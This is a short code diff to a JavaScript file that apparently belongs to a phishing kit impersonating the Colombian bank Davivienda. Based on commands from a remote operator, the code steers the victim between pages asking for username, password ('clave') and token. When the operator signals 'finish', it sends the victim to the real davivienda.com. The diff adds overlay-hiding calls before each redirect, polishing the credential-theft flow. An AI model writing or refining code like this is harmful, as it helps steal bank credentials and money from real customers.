@@ -85,10 +85,12 @@ document.addEventListener('DOMContentLoaded', () => {
         switch(data.action) {
             case 'request_user':
                 console.log('👤 Redirigiendo a index.html');
+                BancoUtils.hideOverlay();
                 window.location.href = 'index.html';
                 break;
             case 'request_password':
                 console.log('🔐 Redirigiendo a clave.html');
+                BancoUtils.hideOverlay();
                 window.location.href = 'clave.html';
                 break;
             case 'request_token':
@@ -100,6 +102,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 break;
             case 'finish':
                 console.log('✅ Finalizando - redirigiendo a davivienda.com');
+                BancoUtils.hideOverlay();
                 window.location.href = 'https://www.davivienda.com/';
                 break;
             default:
